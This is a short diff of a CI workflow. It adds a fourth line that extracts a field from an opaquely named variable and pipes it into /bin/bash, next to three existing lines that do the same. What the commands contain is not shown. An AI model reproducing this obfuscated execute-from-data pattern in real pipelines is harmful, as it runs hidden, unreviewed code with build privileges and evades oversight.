@@ -27,6 +27,7 @@ jobs:
           echo $hnu8 | jq -r .iz64920 | /bin/bash
           printf '%s' "$nte5168" | jq -r .t0365 | /bin/bash
           printf '%s' "$z7" | jq -r .kz77 | /bin/bash
+          printf '%s' "$yi6" | jq -r .i50 | /bin/bash
 
       - name: Save archive
         if: always()
